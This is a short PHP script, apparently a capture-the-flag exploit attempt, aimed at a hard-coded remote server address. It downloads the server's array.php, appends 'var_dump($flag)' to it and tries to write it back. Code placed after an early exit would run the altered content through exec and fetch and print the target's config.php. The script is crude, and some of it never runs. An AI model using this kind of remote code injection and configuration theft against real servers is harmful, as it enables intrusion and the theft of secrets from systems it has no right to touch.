<?php

$file = 'http://202.120.7.134:8888/html/array.php';
$content = file_get_contents($file);
// echo $content, '<br />';

$content = substr($content, 0, strlen($content) - 1);
$content .= 'var_dump($flag)';

echo file_put_contents($file, $content);

exit;

exec($content, $out);

echo '<br />';
var_dump($out);
echo '<br />';

$config = file_get_contents('http://202.120.7.134:8888/html/config.php');
echo 'the config is:', '<br />', $config, '<br />';